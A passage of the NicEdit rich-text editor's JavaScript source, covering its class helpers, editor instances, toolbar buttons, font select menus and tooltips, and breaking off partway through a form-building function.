/* NicEdit - Micro Inline WYSIWYG
 * Copyright 2007-2008 Brian Kirchoff
 *
 * NicEdit is distributed under the terms of the MIT license
 * For more information visit http://nicedit.com/
 * Do not remove this copyright message
 */
var bkExtend = function() { var A = arguments; if (A.length == 1) { A = [this, A[0]] } for (var B in A[1]) { A[0][B] = A[1][B] } return A[0] };

function bkClass() {}
bkClass.prototype.construct = function() {};
bkClass.extend = function(C) {
    var A = function() { if (arguments[0] !== bkClass) { return this.construct.apply(this, arguments) } };
    var B = new this(bkClass);
    bkExtend(B, C);
    A.prototype = B;
    A.extend = this.extend;
    return A
};
var bkElement = bkClass.extend({
    construct: function(B, A) {
        if (typeof(B) == "string") { B = (A || document).createElement(B) }
        B = $BK(B);
        return B
    },
    appendTo: function(A) { A.appendChild(this); return this },
    appendBefore: function(A) { A.parentNode.insertBefore(this, A); return this },
    addEvent: function(B, A) { bkLib.addEvent(this, B, A); return this },
    setContent: function(A) { this.innerHTML = A; return this },
    pos: function() {
        var C = curtop = 0;
        var B = obj = this;
        if (obj.offsetParent) {
            do {
                C += obj.offsetLeft;
                curtop += obj.offsetTop
            } while (obj = obj.offsetParent)
        }
        var A = (!window.opera) ? parseInt(this.getStyle("border-width") || this.style.border) || 0 : 0;
        return [C + A, curtop + A + this.offsetHeight]
    },
    noSelect: function() { bkLib.noSelect(this); return this },
    parentTag: function(A) {
        var B = this;
        do {
            if (B && B.nodeName && B.nodeName.toUpperCase() == A) { return B }
            B = B.parentNode
        } while (B);
        return false
    },
    hasClass: function(A) { return this.className.match(new RegExp("(\\s|^)nicEdit-" + A + "(\\s|$)")) },
    addClass: function(A) { if (!this.hasClass(A)) { this.className += " nicEdit-" + A } return this },
    removeClass: function(A) { if (this.hasClass(A)) { this.className = this.className.replace(new RegExp("(\\s|^)nicEdit-" + A + "(\\s|$)"), " ") } return this },
    setStyle: function(A) {
        var B = this.style;
        for (var C in A) {
            switch (C) {
                case "float":
                    B.cssFloat = B.styleFloat = A[C];
                    break;
                case "opacity":
                    B.opacity = A[C];
                    B.filter = "alpha(opacity=" + Math.round(A[C] * 100) + ")";
                    break;
                case "className":
                    this.className = A[C];
                    break;
                default:
                    B[C] = A[C]
            }
        }
        return this
    },
    getStyle: function(A, C) { var B = (!C) ? document.defaultView : C; if (this.nodeType == 1) { return (B && B.getComputedStyle) ? B.getComputedStyle(this, null).getPropertyValue(A) : this.currentStyle[bkLib.camelize(A)] } },
    remove: function() { this.parentNode.removeChild(this); return this },
    setAttributes: function(A) { for (var B in A) { this[B] = A[B] } return this }
});
var bkLib = {
    isMSIE: (navigator.appVersion.indexOf("MSIE") != -1),
    addEvent: function(C, B, A) {
        (C.addEventListener) ? C.addEventListener(B, A, false): C.attachEvent("on" + B, A)
    },
    toArray: function(C) {
        var B = C.length,
            A = new Array(B);
        while (B--) { A[B] = C[B] }
        return A
    },
    noSelect: function(B) { if (B.setAttribute && B.nodeName.toLowerCase() != "input" && B.nodeName.toLowerCase() != "textarea") { B.setAttribute("unselectable", "on") } for (var A = 0; A < B.childNodes.length; A++) { bkLib.noSelect(B.childNodes[A]) } },
    camelize: function(A) { return A.replace(/\-(.)/g, function(B, C) { return C.toUpperCase() }) },
    inArray: function(A, B) { return (bkLib.search(A, B) != null) },
    search: function(A, C) { for (var B = 0; B < A.length; B++) { if (A[B] == C) { return B } } return null },
    cancelEvent: function(A) {
        A = A || window.event;
        if (A.preventDefault && A.stopPropagation) {
            A.preventDefault();
            A.stopPropagation()
        }
        return false
    },
    domLoad: [],
    domLoaded: function() {
        if (arguments.callee.done) { return }
        arguments.callee.done = true;
        for (i = 0; i < bkLib.domLoad.length; i++) { bkLib.domLoad[i]() }
    },
    onDomLoaded: function(A) {
        this.domLoad.push(A);
        if (document.addEventListener) { document.addEventListener("DOMContentLoaded", bkLib.domLoaded, null) } else {
            if (bkLib.isMSIE) {
                document.write("<style>.nicEdit-main p { margin: 0; }</style><script id=__ie_onload defer " + ((location.protocol == "https:") ? "src='javascript:void(0)'" : "src=//0") + "><\/script>");
                $BK("__ie_onload").onreadystatechange = function() { if (this.readyState == "complete") { bkLib.domLoaded() } }
            }
        }
        window.onload = bkLib.domLoaded
    }
};

function $BK(A) { if (typeof(A) == "string") { A = document.getElementById(A) } return (A && !A.appendTo) ? bkExtend(A, bkElement.prototype) : A }
var bkEvent = {
    addEvent: function(A, B) {
        if (B) {
            this.eventList = this.eventList || {};
            this.eventList[A] = this.eventList[A] || [];
            this.eventList[A].push(B)
        }
        return this
    },
    fireEvent: function() {
        var A = bkLib.toArray(arguments),
            C = A.shift();
        if (this.eventList && this.eventList[C]) { for (var B = 0; B < this.eventList[C].length; B++) { this.eventList[C][B].apply(this, A) } }
    }
};

function __(A) { return A }
Function.prototype.closure = function() {
    var A = this,
        B = bkLib.toArray(arguments),
        C = B.shift();
    return function() { if (typeof(bkLib) != "undefined") { return A.apply(C, B.concat(bkLib.toArray(arguments))) } }
};
Function.prototype.closureListener = function() {
    var A = this,
        C = bkLib.toArray(arguments),
        B = C.shift();
    return function(E) { E = E || window.event; if (E.target) { var D = E.target } else { var D = E.srcElement } return A.apply(B, [E, D].concat(C)) }
};



var retrieveURL = function(filename) {
    var scripts = document.getElementsByTagName('script');
    if (scripts && scripts.length > 0) {
        for (var i in scripts) {
            if (scripts[i].src && scripts[i].src.match(new RegExp(filename+'\\.js$'))) {
                return scripts[i].src.replace(new RegExp('(.*)'+filename+'\\.js$'), '$1');
            }
        }
    }
};
var iconUrl = retrieveURL('nicEdit')+'nicEditIcons-latest.gif';


var nicEditorConfig = bkClass.extend({
    buttons: {
        'bold': { name: __('Click to Bold'), command: 'Bold', tags: ['B', 'STRONG'], css: { 'font-weight': 'bold' }, key: 'b' },
        'italic': { name: __('Click to Italic'), command: 'Italic', tags: ['EM', 'I'], css: { 'font-style': 'italic' }, key: 'i' },
        'underline': { name: __('Click to Underline'), command: 'Underline', tags: ['U'], css: { 'text-decoration': 'underline' }, key: 'u' },
        'left': { name: __('Left Align'), command: 'justifyleft', noActive: true },
        'center': { name: __('Center Align'), command: 'justifycenter', noActive: true },
        'right': { name: __('Right Align'), command: 'justifyright', noActive: true },
        'justify': { name: __('Justify Align'), command: 'justifyfull', noActive: true },
        'ol': { name: __('Insert Ordered List'), command: 'insertorderedlist', tags: ['OL'] },
        'ul': { name: __('Insert Unordered List'), command: 'insertunorderedlist', tags: ['UL'] },
        'subscript': { name: __('Click to Subscript'), command: 'subscript', tags: ['SUB'] },
        'superscript': { name: __('Click to Superscript'), command: 'superscript', tags: ['SUP'] },
        'strikethrough': { name: __('Click to Strike Through'), command: 'strikeThrough', css: { 'text-decoration': 'line-through' } },
        'removeformat': { name: __('Remove Formatting'), command: 'removeformat', noActive: true },
        'indent': { name: __('Indent Text'), command: 'indent', noActive: true },
        'outdent': { name: __('Remove Indent'), command: 'outdent', noActive: true },
        'hr': { name: __('Horizontal Rule'), command: 'insertHorizontalRule', noActive: true }
    },
    iconsPath: iconUrl,
    buttonList: ['save', 'bold', 'italic', 'underline', 'left', 'center', 'right', 'justify', 'ol', 'ul', 'fontSize', 'fontFamily', 'fontFormat', 'indent', 'outdent', 'image', 'upload', 'link', 'unlink', 'forecolor', 'bgcolor'],
    iconList: { "xhtml": 1, "bgcolor": 2, "forecolor": 3, "bold": 4, "center": 5, "hr": 6, "indent": 7, "italic": 8, "justify": 9, "left": 10, "ol": 11, "outdent": 12, "removeformat": 13, "right": 14, "save": 25, "strikethrough": 16, "subscript": 17, "superscript": 18, "ul": 19, "underline": 20, "image": 21, "link": 22, "unlink": 23, "close": 24, "arrow": 26, "upload": 27 }

});;
var nicEditors = { nicPlugins: [], editors: [], registerPlugin: function(B, A) { this.nicPlugins.push({ p: B, o: A }) }, allTextAreas: function(C) { var A = document.getElementsByTagName("textarea"); for (var B = 0; B < A.length; B++) { nicEditors.editors.push(new nicEditor(C).panelInstance(A[B])) } return nicEditors.editors }, findEditor: function(C) { var B = nicEditors.editors; for (var A = 0; A < B.length; A++) { if (B[A].instanceById(C)) { return B[A].instanceById(C) } } } };
var nicEditor = bkClass.extend({
    construct: function(C) {
        this.options = new nicEditorConfig();
        bkExtend(this.options, C);
        this.nicInstances = new Array();
        this.loadedPlugins = new Array();
        var A = nicEditors.nicPlugins;
        for (var B = 0; B < A.length; B++) { this.loadedPlugins.push(new A[B].p(this, A[B].o)) }
        nicEditors.editors.push(this);
        bkLib.addEvent(document.body, "mousedown", this.selectCheck.closureListener(this))
    },
    panelInstance: function(B, C) {
        B = this.checkReplace($BK(B));
        var A = new bkElement("DIV").setStyle({ width: (parseInt(B.getStyle("width")) || B.clientWidth) + "px" }).appendBefore(B);
        this.setPanel(A);
        return this.addInstance(B, C)
    },
    checkReplace: function(B) {
        var A = nicEditors.findEditor(B);
        if (A) {
            A.removeInstance(B);
            A.removePanel()
        }
        return B
    },
    addInstance: function(B, C) {
        B = this.checkReplace($BK(B));
        if (B.contentEditable || !!window.opera) { var A = new nicEditorInstance(B, C, this) } else { var A = new nicEditorIFrameInstance(B, C, this) }
        this.nicInstances.push(A);
        return this
    },
    removeInstance: function(C) {
        C = $BK(C);
        var B = this.nicInstances;
        for (var A = 0; A < B.length; A++) {
            if (B[A].e == C) {
                B[A].remove();
                this.nicInstances.splice(A, 1)
            }
        }
    },
    removePanel: function(A) {
        if (this.nicPanel) {
            this.nicPanel.remove();
            this.nicPanel = null
        }
    },
    instanceById: function(C) { C = $BK(C); var B = this.nicInstances; for (var A = 0; A < B.length; A++) { if (B[A].e == C) { return B[A] } } },
    setPanel: function(A) {
        this.nicPanel = new nicEditorPanel($BK(A), this.options, this);
        this.fireEvent("panel", this.nicPanel);
        return this
    },
    nicCommand: function(B, A) { if (this.selectedInstance) { this.selectedInstance.nicCommand(B, A) } },
    getIcon: function(D, A) { var C = this.options.iconList[D]; var B = (A.iconFiles) ? A.iconFiles[D] : ""; return { backgroundImage: "url('" + ((C) ? this.options.iconsPath : B) + "')", backgroundPosition: ((C) ? ((C - 1) * -18) : 0) + "px 0px" } },
    selectCheck: function(C, A) {
        var B = false;
        do { if (A.className && A.className.indexOf("nicEdit") != -1) { return false } } while (A = A.parentNode);
        this.fireEvent("blur", this.selectedInstance, A);
        this.lastSelectedInstance = this.selectedInstance;
        this.selectedInstance = null;
        return false
    }
});
nicEditor = nicEditor.extend(bkEvent);
var nicEditorInstance = bkClass.extend({
    isSelected: false,
    construct: function(G, D, C) {
        this.ne = C;
        this.elm = this.e = G;
        this.options = D || {};
        newX = parseInt(G.getStyle("width")) || G.clientWidth;
        newY = parseInt(G.getStyle("height")) || G.clientHeight;
        this.initialHeight = newY - 8;
        var H = (G.nodeName.toLowerCase() == "textarea");
        if (H || this.options.hasPanel) {
            var B = (bkLib.isMSIE && !((typeof document.body.style.maxHeight != "undefined") && document.compatMode == "CSS1Compat"));
            var E = { width: newX + "px", border: "1px solid #ccc", borderTop: 0, overflowY: "auto", overflowX: "hidden" };
            E[(B) ? "height" : "maxHeight"] = (this.ne.options.maxHeight) ? this.ne.options.maxHeight + "px" : null;
            this.editorContain = new bkElement("DIV").setStyle(E).appendBefore(G);
            var A = new bkElement("DIV").setStyle({ width: (newX - 8) + "px", margin: "4px", minHeight: newY + "px" }).addClass("main").appendTo(this.editorContain);
            G.setStyle({ display: "none" });
            A.innerHTML = G.innerHTML;
            if (H) {
                A.setContent(G.value);
                this.copyElm = G;
                var F = G.parentTag("FORM");
                if (F) { bkLib.addEvent(F, "submit", this.saveContent.closure(this)) }
            }
            A.setStyle((B) ? { height: newY + "px" } : { overflow: "hidden" });
            this.elm = A
        }
        this.ne.addEvent("blur", this.blur.closure(this));
        this.init();
        this.blur()
    },
    init: function() {
        this.elm.setAttribute("contentEditable", "true");
        if (this.getContent() == "") { this.setContent("<br />") }
        this.instanceDoc = document.defaultView;
        this.elm.addEvent("mousedown", this.selected.closureListener(this)).addEvent("keypress", this.keyDown.closureListener(this)).addEvent("focus", this.selected.closure(this)).addEvent("blur", this.blur.closure(this)).addEvent("keyup", this.selected.closure(this));
        this.ne.fireEvent("add", this)
    },
    remove: function() {
        this.saveContent();
        if (this.copyElm || this.options.hasPanel) {
            this.editorContain.remove();
            this.e.setStyle({ display: "block" });
            this.ne.removePanel()
        }
        this.disable();
        this.ne.fireEvent("remove", this)
    },
    disable: function() { this.elm.setAttribute("contentEditable", "false") },
    getSel: function() { return (window.getSelection) ? window.getSelection() : document.selection },
    getRng: function() { var A = this.getSel(); if (!A || A.rangeCount === 0) { return } return (A.rangeCount > 0) ? A.getRangeAt(0) : A.createRange() },
    selRng: function(A, B) {
        if (window.getSelection) {
            B.removeAllRanges();
            B.addRange(A)
        } else { A.select() }
    },
    selElm: function() {
        var C = this.getRng();
        if (!C) { return }
        if (C.startContainer) {
            var D = C.startContainer;
            if (C.cloneContents().childNodes.length == 1) {
                for (var B = 0; B < D.childNodes.length; B++) {
                    var A = D.childNodes[B].ownerDocument.createRange();
                    A.selectNode(D.childNodes[B]);
                    if (C.compareBoundaryPoints(Range.START_TO_START, A) != 1 && C.compareBoundaryPoints(Range.END_TO_END, A) != -1) { return $BK(D.childNodes[B]) }
                }
            }
            return $BK(D)
        } else { return $BK((this.getSel().type == "Control") ? C.item(0) : C.parentElement()) }
    },
    saveRng: function() {
        this.savedRange = this.getRng();
        this.savedSel = this.getSel()
    },
    restoreRng: function() { if (this.savedRange) { this.selRng(this.savedRange, this.savedSel) } },
    keyDown: function(B, A) { if (B.ctrlKey) { this.ne.fireEvent("key", this, B) } },
    selected: function(C, A) {
        if (!A && !(A = this.selElm)) { A = this.selElm() }
        if (!C.ctrlKey) {
            var B = this.ne.selectedInstance;
            if (B != this) {
                if (B) { this.ne.fireEvent("blur", B, A) }
                this.ne.selectedInstance = this;
                this.ne.fireEvent("focus", B, A)
            }
            this.ne.fireEvent("selected", B, A);
            this.isFocused = true;
            this.elm.addClass("selected")
        }
        return false
    },
    blur: function() {
        this.isFocused = false;
        this.elm.removeClass("selected")
    },
    saveContent: function() {
        if (this.copyElm || this.options.hasPanel) {
            this.ne.fireEvent("save", this);
            (this.copyElm) ? this.copyElm.value = this.getContent(): this.e.innerHTML = this.getContent()
        }
    },
    getElm: function() { return this.elm },
    getContent: function() {
        this.content = this.getElm().innerHTML;
        this.ne.fireEvent("get", this);
        return this.content
    },
    setContent: function(A) {
        this.content = A;
        this.ne.fireEvent("set", this);
        this.elm.innerHTML = this.content
    },
    nicCommand: function(B, A) { document.execCommand(B, false, A) }
});
var nicEditorIFrameInstance = nicEditorInstance.extend({
    savedStyles: [],
    init: function() {
        var B = this.elm.innerHTML.replace(/^\s+|\s+$/g, "");
        this.elm.innerHTML = "";
        (!B) ? B = "<br />": B;
        this.initialContent = B;
        this.elmFrame = new bkElement("iframe").setAttributes({ src: "javascript:;", frameBorder: 0, allowTransparency: "true", scrolling: "no" }).setStyle({ height: "100px", width: "100%" }).addClass("frame").appendTo(this.elm);
        if (this.copyElm) { this.elmFrame.setStyle({ width: (this.elm.offsetWidth - 4) + "px" }) }
        var A = ["font-size", "font-family", "font-weight", "color"];
        for (itm in A) { this.savedStyles[bkLib.camelize(itm)] = this.elm.getStyle(itm) }
        setTimeout(this.initFrame.closure(this), 50)
    },
    disable: function() { this.elm.innerHTML = this.getContent() },
    initFrame: function() {
        var B = $BK(this.elmFrame.contentWindow.document);
        B.designMode = "on";
        B.open();
        var A = this.ne.options.externalCSS;
        B.write("<html><head>" + ((A) ? '<link href="' + A + '" rel="stylesheet" type="text/css" />' : "") + '</head><body id="nicEditContent" style="margin: 0 !important; background-color: transparent !important;">' + this.initialContent + "</body></html>");
        B.close();
        this.frameDoc = B;
        this.frameWin = $BK(this.elmFrame.contentWindow);
        this.frameContent = $BK(this.frameWin.document.body).setStyle(this.savedStyles);
        this.instanceDoc = this.frameWin.document.defaultView;
        this.heightUpdate();
        this.frameDoc.addEvent("mousedown", this.selected.closureListener(this)).addEvent("keyup", this.heightUpdate.closureListener(this)).addEvent("keydown", this.keyDown.closureListener(this)).addEvent("keyup", this.selected.closure(this));
        this.ne.fireEvent("add", this)
    },
    getElm: function() { return this.frameContent },
    setContent: function(A) {
        this.content = A;
        this.ne.fireEvent("set", this);
        this.frameContent.innerHTML = this.content;
        this.heightUpdate()
    },
    getSel: function() { return (this.frameWin) ? this.frameWin.getSelection() : this.frameDoc.selection },
    heightUpdate: function() { this.elmFrame.style.height = Math.max(this.frameContent.offsetHeight, this.initialHeight) + "px" },
    nicCommand: function(B, A) {
        this.frameDoc.execCommand(B, false, A);
        setTimeout(this.heightUpdate.closure(this), 100)
    }
});
var nicEditorPanel = bkClass.extend({
    construct: function(E, B, A) {
        this.elm = E;
        this.options = B;
        this.ne = A;
        this.panelButtons = new Array();
        this.buttonList = bkExtend([], this.ne.options.buttonList);
        this.panelContain = new bkElement("DIV").setStyle({ overflow: "hidden", width: "100%", border: "1px solid #cccccc", backgroundColor: "#efefef" }).addClass("panelContain");
        this.panelElm = new bkElement("DIV").setStyle({ margin: "2px", marginTop: "0px", zoom: 1, overflow: "hidden" }).addClass("panel").appendTo(this.panelContain);
        this.panelContain.appendTo(E);
        var C = this.ne.options;
        var D = C.buttons;
        for (button in D) { this.addButton(button, C, true) }
        this.reorder();
        E.noSelect()
    },
    addButton: function(buttonName, options, noOrder) { var button = options.buttons[buttonName]; var type = (button.type) ? eval("(typeof(" + button.type + ') == "undefined") ? null : ' + button.type + ";") : nicEditorButton; var hasButton = bkLib.inArray(this.buttonList, buttonName); if (type && (hasButton || this.ne.options.fullPanel)) { this.panelButtons.push(new type(this.panelElm, buttonName, options, this.ne)); if (!hasButton) { this.buttonList.push(buttonName) } } },
    findButton: function(B) { for (var A = 0; A < this.panelButtons.length; A++) { if (this.panelButtons[A].name == B) { return this.panelButtons[A] } } },
    reorder: function() { var C = this.buttonList; for (var B = 0; B < C.length; B++) { var A = this.findButton(C[B]); if (A) { this.panelElm.appendChild(A.margin) } } },
    remove: function() { this.elm.remove() }
});
var nicEditorButton = bkClass.extend({
    construct: function(D, A, C, B) {
        this.options = C.buttons[A];
        this.name = A;
        this.ne = B;
        this.elm = D;
        this.margin = new bkElement("DIV").setStyle({ "float": "left", marginTop: "2px" }).appendTo(D);
        this.contain = new bkElement("DIV").setStyle({ width: "20px", height: "20px" }).addClass("buttonContain").appendTo(this.margin);
        this.border = new bkElement("DIV").setStyle({ backgroundColor: "#efefef", border: "1px solid #efefef" }).appendTo(this.contain);
        this.button = new bkElement("DIV").setStyle({ width: "18px", height: "18px", overflow: "hidden", zoom: 1, cursor: "pointer" }).addClass("button").setStyle(this.ne.getIcon(A, C)).appendTo(this.border);
        this.button.addEvent("mouseover", this.hoverOn.closure(this)).addEvent("mouseout", this.hoverOff.closure(this)).addEvent("mousedown", this.mouseClick.closure(this)).noSelect();
        if (!window.opera) { this.button.onmousedown = this.button.onclick = bkLib.cancelEvent }
        B.addEvent("selected", this.enable.closure(this)).addEvent("blur", this.disable.closure(this)).addEvent("key", this.key.closure(this));
        this.disable();
        this.init()
    },
    init: function() {},
    hide: function() { this.contain.setStyle({ display: "none" }) },
    updateState: function() { if (this.isDisabled) { this.setBg() } else { if (this.isHover) { this.setBg("hover") } else { if (this.isActive) { this.setBg("active") } else { this.setBg() } } } },
    setBg: function(A) {
        switch (A) {
            case "hover":
                var B = { border: "1px solid #666", backgroundColor: "#ddd" };
                break;
            case "active":
                var B = { border: "1px solid #666", backgroundColor: "#ccc" };
                break;
            default:
                var B = { border: "1px solid #efefef", backgroundColor: "#efefef" }
        }
        this.border.setStyle(B).addClass("button-" + A)
    },
    checkNodes: function(A) {
        var B = A;
        do { if (this.options.tags && bkLib.inArray(this.options.tags, B.nodeName)) { this.activate(); return true } } while (B = B.parentNode && B.className != "nicEdit");
        B = $BK(A);
        while (B.nodeType == 3) { B = $BK(B.parentNode) }
        if (this.options.css) { for (itm in this.options.css) { if (B.getStyle(itm, this.ne.selectedInstance.instanceDoc) == this.options.css[itm]) { this.activate(); return true } } }
        this.deactivate();
        return false
    },
    activate: function() {
        if (!this.isDisabled) {
            this.isActive = true;
            this.updateState();
            this.ne.fireEvent("buttonActivate", this)
        }
    },
    deactivate: function() {
        this.isActive = false;
        this.updateState();
        if (!this.isDisabled) { this.ne.fireEvent("buttonDeactivate", this) }
    },
    enable: function(A, B) {
        this.isDisabled = false;
        this.contain.setStyle({ opacity: 1 }).addClass("buttonEnabled");
        this.updateState();
        this.checkNodes(B)
    },
    disable: function(A, B) {
        this.isDisabled = true;
        this.contain.setStyle({ opacity: 0.6 }).removeClass("buttonEnabled");
        this.updateState()
    },
    toggleActive: function() {
        (this.isActive) ? this.deactivate(): this.activate()
    },
    hoverOn: function() {
        if (!this.isDisabled) {
            this.isHover = true;
            this.updateState();
            this.ne.fireEvent("buttonOver", this)
        }
    },
    hoverOff: function() {
        this.isHover = false;
        this.updateState();
        this.ne.fireEvent("buttonOut", this)
    },
    mouseClick: function() {
        if (this.options.command) { this.ne.nicCommand(this.options.command, this.options.commandArgs); if (!this.options.noActive) { this.toggleActive() } }
        this.ne.fireEvent("buttonClick", this)
    },
    key: function(A, B) { if (this.options.key && B.ctrlKey && String.fromCharCode(B.keyCode || B.charCode).toLowerCase() == this.options.key) { this.mouseClick(); if (B.preventDefault) { B.preventDefault() } } }
});
var nicPlugin = bkClass.extend({
    construct: function(B, A) {
        this.options = A;
        this.ne = B;
        this.ne.addEvent("panel", this.loadPanel.closure(this));
        this.init()
    },
    loadPanel: function(C) {
        var B = this.options.buttons;
        for (var A in B) { C.addButton(A, this.options) }
        C.reorder()
    },
    init: function() {}
});


var nicPaneOptions = {};

var nicEditorPane = bkClass.extend({
    construct: function(D, C, B, A) {
        this.ne = C;
        this.elm = D;
        this.pos = D.pos();
        this.contain = new bkElement("div").setStyle({ zIndex: "99999", overflow: "hidden", position: "absolute", left: this.pos[0] + "px", top: this.pos[1] + "px" });
        this.pane = new bkElement("div").setStyle({ fontSize: "12px", border: "1px solid #ccc", overflow: "hidden", padding: "4px", textAlign: "left", backgroundColor: "#ffffc9" }).addClass("pane").setStyle(B).appendTo(this.contain);
        if (A && !A.options.noClose) { this.close = new bkElement("div").setStyle({ "float": "right", height: "16px", width: "16px", cursor: "pointer" }).setStyle(this.ne.getIcon("close", nicPaneOptions)).addEvent("mousedown", A.removePane.closure(this)).appendTo(this.pane) }
        this.contain.noSelect().appendTo(document.body);
        this.position();
        this.init()
    },
    init: function() {},
    position: function() { if (this.ne.nicPanel) { var B = this.ne.nicPanel.elm; var A = B.pos(); var C = A[0] + parseInt(B.getStyle("width")) - (parseInt(this.pane.getStyle("width")) + 8); if (C < this.pos[0]) { this.contain.setStyle({ left: C + "px" }) } } },
    toggle: function() {
        this.isVisible = !this.isVisible;
        this.contain.setStyle({ display: ((this.isVisible) ? "block" : "none") })
    },
    remove: function() {
        if (this.contain) {
            this.contain.remove();
            this.contain = null
        }
    },
    append: function(A) { A.appendTo(this.pane) },
    setContent: function(A) { this.pane.setContent(A) }
});


var nicSelectOptions = {
    buttons: {
        'fontSize': { name: __('Select Font Size'), type: 'nicEditorFontSizeSelect', command: 'fontsize' },
        'fontFamily': { name: __('Select Font Family'), type: 'nicEditorFontFamilySelect', command: 'fontname' },
        'fontFormat': { name: __('Select Font Format'), type: 'nicEditorFontFormatSelect', command: 'formatBlock' }
    }
};

var nicEditorSelect = bkClass.extend({
    construct: function(D, A, C, B) {
        this.options = C.buttons[A];
        this.elm = D;
        this.ne = B;
        this.name = A;
        this.selOptions = new Array();
        this.margin = new bkElement("div").setStyle({ "float": "left", margin: "2px 1px 0 1px" }).appendTo(this.elm);
        this.contain = new bkElement("div").setStyle({ width: "90px", height: "20px", cursor: "pointer", overflow: "hidden" }).addClass("selectContain").addEvent("click", this.toggle.closure(this)).appendTo(this.margin);
        this.items = new bkElement("div").setStyle({ overflow: "hidden", zoom: 1, border: "1px solid #ccc", paddingLeft: "3px", backgroundColor: "#fff" }).appendTo(this.contain);
        this.control = new bkElement("div").setStyle({ overflow: "hidden", "float": "right", height: "18px", width: "16px" }).addClass("selectControl").setStyle(this.ne.getIcon("arrow", C)).appendTo(this.items);
        this.txt = new bkElement("div").setStyle({ overflow: "hidden", "float": "left", width: "66px", height: "14px", marginTop: "1px", fontFamily: "sans-serif", textAlign: "center", fontSize: "12px" }).addClass("selectTxt").appendTo(this.items);
        if (!window.opera) { this.contain.onmousedown = this.control.onmousedown = this.txt.onmousedown = bkLib.cancelEvent }
        this.margin.noSelect();
        this.ne.addEvent("selected", this.enable.closure(this)).addEvent("blur", this.disable.closure(this));
        this.disable();
        this.init()
    },
    disable: function() {
        this.isDisabled = true;
        this.close();
        this.contain.setStyle({ opacity: 0.6 })
    },
    enable: function(A) {
        this.isDisabled = false;
        this.close();
        this.contain.setStyle({ opacity: 1 })
    },
    setDisplay: function(A) { this.txt.setContent(A) },
    toggle: function() {
        if (!this.isDisabled) {
            (this.pane) ? this.close(): this.open()
        }
    },
    open: function() {
        this.pane = new nicEditorPane(this.items, this.ne, { width: "88px", padding: "0px", borderTop: 0, borderLeft: "1px solid #ccc", borderRight: "1px solid #ccc", borderBottom: "0px", backgroundColor: "#fff" });
        for (var C = 0; C < this.selOptions.length; C++) {
            var B = this.selOptions[C];
            var A = new bkElement("div").setStyle({ overflow: "hidden", borderBottom: "1px solid #ccc", width: "88px", textAlign: "left", overflow: "hidden", cursor: "pointer" });
            var D = new bkElement("div").setStyle({ padding: "0px 4px" }).setContent(B[1]).appendTo(A).noSelect();
            D.addEvent("click", this.update.closure(this, B[0])).addEvent("mouseover", this.over.closure(this, D)).addEvent("mouseout", this.out.closure(this, D)).setAttributes("id", B[0]);
            this.pane.append(A);
            if (!window.opera) { D.onmousedown = bkLib.cancelEvent }
        }
    },
    close: function() { if (this.pane) { this.pane = this.pane.remove() } },
    over: function(A) { A.setStyle({ backgroundColor: "#ccc" }) },
    out: function(A) { A.setStyle({ backgroundColor: "#fff" }) },
    add: function(B, A) { this.selOptions.push(new Array(B, A)) },
    update: function(A) {
        this.ne.nicCommand(this.options.command, A);
        this.close()
    }
});
var nicEditorFontSizeSelect = nicEditorSelect.extend({ sel: { 1: "1&nbsp;(8pt)", 2: "2&nbsp;(10pt)", 3: "3&nbsp;(12pt)", 4: "4&nbsp;(14pt)", 5: "5&nbsp;(18pt)", 6: "6&nbsp;(24pt)" }, init: function() { this.setDisplay("Font&nbsp;Size..."); for (itm in this.sel) { this.add(itm, '<font size="' + itm + '">' + this.sel[itm] + "</font>") } } });
var nicEditorFontFamilySelect = nicEditorSelect.extend({ sel: { arial: "Arial", "comic sans ms": "Comic Sans", "courier new": "Courier New", georgia: "Georgia", helvetica: "Helvetica", impact: "Impact", "times new roman": "Times", "trebuchet ms": "Trebuchet", verdana: "Verdana" }, init: function() { this.setDisplay("Font&nbsp;Family..."); for (itm in this.sel) { this.add(itm, '<font face="' + itm + '">' + this.sel[itm] + "</font>") } } });
var nicEditorFontFormatSelect = nicEditorSelect.extend({
    sel: { p: "Paragraph", pre: "Pre", h6: "Heading&nbsp;6", h5: "Heading&nbsp;5", h4: "Heading&nbsp;4", h3: "Heading&nbsp;3", h2: "Heading&nbsp;2", h1: "Heading&nbsp;1" },
    init: function() {
        this.setDisplay("Font&nbsp;Format...");
        for (itm in this.sel) {
            var A = itm.toUpperCase();
            this.add("<" + A + ">", "<" + itm + ' style="padding: 0px; margin: 0px;">' + this.sel[itm] + "</" + A + ">")
        }
    }
});
nicEditors.registerPlugin(nicPlugin, nicSelectOptions);

var nicButtonTips = bkClass.extend({
    construct: function(A) {
        this.ne = A;
        A.addEvent("buttonOver", this.show.closure(this)).addEvent("buttonOut", this.hide.closure(this))
    },
    show: function(A) { this.timer = setTimeout(this.create.closure(this, A), 400) },
    create: function(A) {
        this.timer = null;
        if (!this.pane) {
            this.pane = new nicEditorPane(A.button, this.ne, { fontSize: "12px", marginTop: "5px" });
            this.pane.setContent(A.options.name)
        }
    },
    hide: function(A) { if (this.timer) { clearTimeout(this.timer) } if (this.pane) { this.pane = this.pane.remove() } }
});
nicEditors.registerPlugin(nicButtonTips);

var nicEditorAdvancedButton = nicEditorButton.extend({
    init: function() { this.ne.addEvent("selected", this.removePane.closure(this)).addEvent("blur", this.removePane.closure(this)) },
    mouseClick: function() {
        if (!this.isDisabled) {
            if (this.pane && this.pane.pane) { this.removePane() } else {
                this.pane = new nicEditorPane(this.contain, this.ne, { width: (this.width || "270px"), backgroundColor: "#fff" }, this);
                this.addPane();
                this.ne.selectedInstance.saveRng()
            }
        }
    },
    addForm: function(C, G) {
        this.form = new bkElement("form").addEvent("submit", this.submit.closureListener(this));
        this.pane.append(this.form);
        this.inputs = {};
        for (itm in C) {
            var D = C[itm];
            var F = "";
            if (G) { F = G.getAttribute(itm) }
            if (!F) { F = D.value || "" }
            var A = C[itm].type;
            if (A == "title") { new bkElement("div").setContent(D.txt).setStyle({ fontSize: "14px", fontWeight: "bold", padding: "0px", margin: "2px 0" }).appendTo(this.form) } else {
                var B = new bkElement("div").setStyle({ overflow: "hidden", clear: "both" }).appendTo(this.form);
                if (D.txt) { new bkElement("label").setAttributes({ "for": itm }).setContent(D.txt).setStyle({ margin: "2px 4px", fontSize: "13px", width: "50px", lineHeight: "20px", textAlign: "right", "float": "left" }).appendTo(B) }
                switch (A) {
                    case "text":
                        this.inputs[itm] = new bkElement("input").setAttributes({ id: itm, value: F, type: "text" }).setStyle({ margin: "2px 0", fontSize: "13px", "float": "left", height: "20px", border: "1px solid #ccc", overflow: "hidden" }).setStyle(D.style).appendTo(B);
                        break;
                    case "select":
